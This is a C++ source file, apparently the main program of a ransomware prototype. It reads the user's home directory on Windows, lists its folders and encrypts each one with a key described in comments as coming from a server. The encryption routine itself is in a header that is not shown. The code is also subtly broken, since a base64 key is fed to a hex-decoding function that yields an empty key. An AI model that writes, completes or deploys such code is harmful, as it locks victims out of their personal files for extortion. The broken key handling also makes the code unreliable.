#include <stdio.h>
#include "encrypt.h"

// Function to convert a hexadecimal character to its corresponding integer value
int hexCharToInt(char hexChar) {
    if (hexChar >= '0' && hexChar <= '9') {
        return hexChar - '0';
    } else if (hexChar >= 'A' && hexChar <= 'F') {
        return hexChar - 'A' + 10;
    } else if (hexChar >= 'a' && hexChar <= 'f') {
        return hexChar - 'a' + 10;
    }
    return -1; // Invalid hexadecimal character
}

// Function to convert a hexadecimal string to a vector of bytes
std::vector<BYTE> hexStringToBytes(const std::string& hexString) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hexString.size(); i += 2) {
        int highNibble = hexCharToInt(hexString[i]);
        int lowNibble = hexCharToInt(hexString[i + 1]);
        if (highNibble >= 0 && lowNibble >= 0) {
            BYTE byte = static_cast<BYTE>((highNibble << 4) | lowNibble);
            bytes.push_back(byte);
        } else {
            // Handle invalid hexadecimal characters
            // For example, you may choose to skip or terminate conversion
            break;
        }
    }
    return bytes;
}

int main() {
    // Temp decryption key (we will use an imported key later)
    std::string decryptionKeyFromServer = "XETi4T3WnbxMeWiLUJvjGpeGGzM1SvtCVF/mIEiwYtU=";

    // Convert the decryption key from string to BYTE array
    std::vector<BYTE> decryptionKey = hexStringToBytes(decryptionKeyFromServer);

    // Get the user's home directory path
    const wchar_t* userProfileDir = _wgetenv(L"USERPROFILE");
    if (!userProfileDir) {
        std::cerr << "Failed to get user's home directory." << std::endl;
        return 1;
    }

    // Get all folder names within the user's home directory
    std::vector<std::wstring> folderNames = getFolderNames(userProfileDir);

    // Encrypt folders within each user's home directory
    for (const auto& folderName : folderNames) {
        // Construct the folder path
        std::wstring folderPath = userProfileDir;
        folderPath += L"\\" + folderName;

        // Use the decryption key received from the server
        const BYTE* decryptionKeyArray = decryptionKey.data();
        const DWORD keySize = static_cast<DWORD>(decryptionKey.size());

        if (encryptFolder(folderPath, decryptionKeyArray, keySize)) {
            std::wcout << L"Folder '" << folderName << L"' encrypted successfully." << std::endl;
        } else {
            std::wcerr << L"Failed to encrypt folder '" << folderName << L"'." << std::endl;
        }
    }

    getchar();

    return 0;
}
